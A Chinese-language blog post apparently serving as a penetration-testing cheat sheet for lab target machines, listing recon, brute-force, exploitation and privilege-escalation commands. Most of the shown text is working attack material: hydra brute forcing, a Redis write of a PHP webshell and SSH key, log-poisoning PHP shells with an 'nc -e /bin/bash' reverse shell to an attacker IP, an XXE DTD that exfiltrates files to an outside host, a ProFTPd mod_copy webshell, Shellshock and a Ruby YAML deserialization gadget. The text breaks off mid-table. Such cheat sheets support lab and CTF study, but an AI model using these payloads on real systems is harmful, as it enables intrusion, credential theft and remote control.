<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
<meta name="referrer" content="no-referrer" />
  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
  <link rel="manifest" href="/images/logo_icon.svg">
  <meta name="msapplication-config" content="/images/logo_icon.svg">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="迟来的文章">
<meta property="og:type" content="article">
<meta property="og:title" content="靶机渗透手册">
<meta property="og:url" content="https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/index.html">
<meta property="og:site_name" content="xXxYOLOxXx">
<meta property="og:description" content="迟来的文章">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-02-08T03:15:20.000Z">
<meta property="article:modified_time" content="2023-05-31T14:44:24.617Z">
<meta property="article:author" content="xXxYOLOxXx">
<meta property="article:tag" content="Pentest">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>靶机渗透手册 | xXxYOLOxXx</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xXxYOLOxXx</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xXxYOLOxXx">
      <meta itemprop="description" content="Explorer for unknown.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xXxYOLOxXx">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          靶机渗透手册
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-08 11:15:20" itemprop="dateCreated datePublished" datetime="2023-02-08T11:15:20+08:00">2023-02-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-31 22:44:24" itemprop="dateModified" datetime="2023-05-31T22:44:24+08:00">2023-05-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>迟来的文章</p>
<a id="more"></a>
<h1 id="靶机渗透手册"><a class="markdownIt-Anchor" href="#靶机渗透手册"></a> 靶机渗透手册</h1>
<p><code>2020/10/28 21:19:49</code></p>
<h2 id="情报收集"><a class="markdownIt-Anchor" href="#情报收集"></a> 情报收集</h2>
<h3 id="实际渗透"><a class="markdownIt-Anchor" href="#实际渗透"></a> 实际渗透</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/195169.html">全流程信息收集方法总结</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/204883.html">渗透测试信息收集心得分享</a></li>
</ul>
<h3 id="靶机渗透"><a class="markdownIt-Anchor" href="#靶机渗透"></a> 靶机渗透</h3>
<h4 id="查找ip"><a class="markdownIt-Anchor" href="#查找ip"></a> 查找IP</h4>
<ul>
<li>主办方给出(比赛)</li>
<li>netdiscover</li>
<li>路由器查看主机IP(桥接且需权限)</li>
<li>根据虚拟机IP分布，用浏览器逐个访问IP(仅限存在WEB服务，不推荐)</li>
<li><code>nmap -sn -T5 192.168.0.1/24 | grep -B2 -E &quot;(virtual|VMware)&quot;</code>(虚拟机的MAC地址)</li>
<li><code>arp-scan -l</code></li>
</ul>
<h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4>
<ul>
<li><code>nmap -p 1-65535 -sV -v -T5 -n 192.168.0.1</code></li>
<li>-Pn 扫不到Redis，有时候漏了这个信息很难受</li>
</ul>
<h4 id="web路径"><a class="markdownIt-Anchor" href="#web路径"></a> Web路径</h4>
<ul>
<li><code>dirb http://192.168.0.1/ -w</code></li>
<li><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/</code></li>
</ul>
<h4 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h4>
<p><code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></p>
<h4 id="smb信息枚举"><a class="markdownIt-Anchor" href="#smb信息枚举"></a> SMB信息枚举</h4>
<ul>
<li><code>enum4linux 192.168.0.1</code></li>
<li><a target="_blank" rel="noopener" href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></li>
</ul>
<h4 id="wordpress"><a class="markdownIt-Anchor" href="#wordpress"></a> Wordpress</h4>
<ul>
<li>Username: <code>wpscan --url http://192.168.0.1/ -e u</code></li>
<li>Password: <code>wpscan --url http://192.168.0.1/ --username --wordlist /usr/share/wordlists/rockyou.txt</code></li>
<li>Plugins: <code>wpscan --url http://192.168.0.1/ --enumerate ap --plugins-detection aggressive</code></li>
<li>Themes: <code>wpscan --url http://192.168.0.1/ --enumerate at --themes-detection aggressive</code></li>
</ul>
<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
<h3 id="ssh弱口令"><a class="markdownIt-Anchor" href="#ssh弱口令"></a> SSH弱口令</h3>
<p><code>hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.1:22</code></p>
<h3 id="ftp匿名登入"><a class="markdownIt-Anchor" href="#ftp匿名登入"></a> FTP匿名登入</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.1</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
<ul>
<li>FTP Banner</li>
</ul>
<h3 id="smb弱口令"><a class="markdownIt-Anchor" href="#smb弱口令"></a> SMB弱口令</h3>
<p><code>enum4limux 192.168.0.1</code><br />
<code>hydra -L user -P pass -I -e n smb://192.168.0.1</code><br />
<code>smbmap -H 192.168.0.1</code><br />
<code>smbclient //192.168.0.1/dir -U username</code></p>
<h3 id="nfs目录挂载"><a class="markdownIt-Anchor" href="#nfs目录挂载"></a> NFS目录挂载</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script nfs* 192.168.0.1</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim /etc/exports</span><br><span class="line">	/share1 *(sync,ro) 192.168.0.1(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.0.1</span><br><span class="line">	Export list <span class="keyword">for</span> 192.168.0.1:</span><br><span class="line">	/home/peter *</span><br><span class="line">mkdir /mnt/share1</span><br><span class="line">mount -t nfs 192.168.0.1:/home/peter /mnt/share1</span><br><span class="line"><span class="built_in">cd</span> /mnt/share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<h3 id="web认证"><a class="markdownIt-Anchor" href="#web认证"></a> Web认证</h3>
<ul>
<li>Web页面内容生成字典 : <code>cewl http://192.168.31.39/websec -w pass</code></li>
<li>hydra-post-form : <code>hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot;</code></li>
<li>JWT : <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</span><br><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import jwt</span><br><span class="line">&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>HTTP-Basic认证
<ul>
<li>配合Burp的Intruder模块</li>
<li>字典生成脚本</li>
<li>.htaccess (Apache2)</li>
<li>.htpasswd (Apache2)</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">raw = [ </span><br><span class="line">		<span class="string">&#x27;Recon&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Web&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Service&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Blog&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;hackNos&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;TroubleShoot&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Security&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Recon Security&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Secure&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;5ecure&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Secure@hackNos&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Security@hackNos&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> raw:</span><br><span class="line">			<span class="built_in">print</span> base64.b64encode(j + <span class="string">&#x27;:&#x27;</span> + i)</span><br></pre></td></tr></table></figure>
<h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.1 -p 389 --script ldap-search --script-args <span class="string">&#x27;ldap.username=&quot;cn=admin,dc=admin,dc=local&quot;,ldap.password=password&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="redis未授权"><a class="markdownIt-Anchor" href="#redis未授权"></a> Redis未授权</h3>
<ul>
<li>PHP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<ul>
<li>SSH</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat ~/.ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; new.txt</span><br><span class="line">redis-cli -h 192.168.0.1 flushall</span><br><span class="line">cat new.txt | redis-cli -h 1192.168.0.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 192.168.0.1 config <span class="built_in">set</span> dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 192.168.0.1 config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">redis-cli -h 192.168.0.1 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@192.168.0.1</span><br></pre></td></tr></table></figure>
<h3 id="file_includsion"><a class="markdownIt-Anchor" href="#file_includsion"></a> FILE_Includsion</h3>
<ul>
<li>LFI</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>RFI</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.2&#x2F;bfl</span><br></pre></td></tr></table></figure>
<ul>
<li>SMTP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.0.1 25</span><br><span class="line">MAIl FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: Username</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br><span class="line">~~~~~</span><br><span class="line">&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.2 8081</span><br></pre></td></tr></table></figure>
<ul>
<li>SSH</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.1</span><br><span class="line">file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls</span><br></pre></td></tr></table></figure>
<ul>
<li>PHP Filter Chain</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
</blockquote>
<h3 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h3>
<p>LFI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure>
<p>SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.*.*&#x2F;BFL&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure>
<p>LFI+SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.*.*&#x2F;bfl.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;tmp&#x2F;bfl.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?BFL&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3>
<ul>
<li>git信息泄露 :
<ul>
<li><code>/.git/HEAD</code></li>
<li><a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a></li>
</ul>
</li>
<li>DS_Store文件泄露 : ds_store_exp</li>
<li>ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.1 21</span><br><span class="line">site cpfr &#x2F;etc&#x2F;passwd</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;passwd</span><br><span class="line">~~~~~~</span><br><span class="line">nc 192.168.0.1 21</span><br><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>ShellShock</p>
<ul>
<li><code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code> (CVE-2014-6271)</li>
<li><code>env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</code> (CVE-2014-7169)</li>
<li>/cgi-bin/* 200</li>
<li><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.1/cgi-bin/</code></li>
</ul>
</li>
<li>
<p>Ruby YAML.Load() Deserialization</p>
</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Installer</span><br><span class="line">	<span class="symbol">i:</span> x</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::SpecFetcher</span><br><span class="line">	<span class="symbol">i:</span> y</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Requirement</span><br><span class="line">  <span class="symbol">requirements:</span></span><br><span class="line">	!ruby/<span class="symbol">object:</span>Gem::Package::TarReader</span><br><span class="line">	<span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::BufferedIO</span><br><span class="line">	  <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::Package::TarReader::Entry</span><br><span class="line">		 <span class="symbol">read:</span> <span class="number">0</span></span><br><span class="line">		 <span class="symbol">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">	  <span class="symbol">debug_output:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">		 <span class="symbol">socket:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::RequestSet</span><br><span class="line">			 <span class="symbol">sets:</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">				 <span class="symbol">socket:</span> !ruby/<span class="class"><span class="keyword">module</span> &#x27;<span class="title">Kernel</span>&#x27;</span></span><br><span class="line">				 <span class="symbol">method_id:</span> <span class="symbol">:system</span></span><br><span class="line">			 <span class="symbol">git_set:</span> <span class="string">&quot;touch /tmp/hacked&quot;</span></span><br><span class="line">		 <span class="symbol">method_id:</span> <span class="symbol">:resolve</span></span><br></pre></td></tr></table></figure>
<ul>
<li>java
<ul>
<li>pom.xml</li>
</ul>
</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/jeremylong/DependencyCheck">https://github.com/jeremylong/DependencyCheck</a></p>
</blockquote>
<ul>
<li>.NET JSON Deserialize</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15294585.html">https://www.cnblogs.com/nice0e3/p/15294585.html</a><br />
<a target="_blank" rel="noopener" href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15</a></p>
</blockquote>
<ul>
<li>FastCGI</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></p>
</blockquote>
<ul>
<li>Prototype Pollution</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline</a></p>
</blockquote>
<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
<h3 id="cap特权"><a class="markdownIt-Anchor" href="#cap特权"></a> cap特权</h3>
<p><code>getcap -r / 2&gt; /dev/null</code></p>
<table>
<thead>
<tr>
<th>Capabilities</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CAP_AUDIT_CONTROL</td>
<td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
</tr>
<tr>
<td>CAP_AUDIT_READ</td>
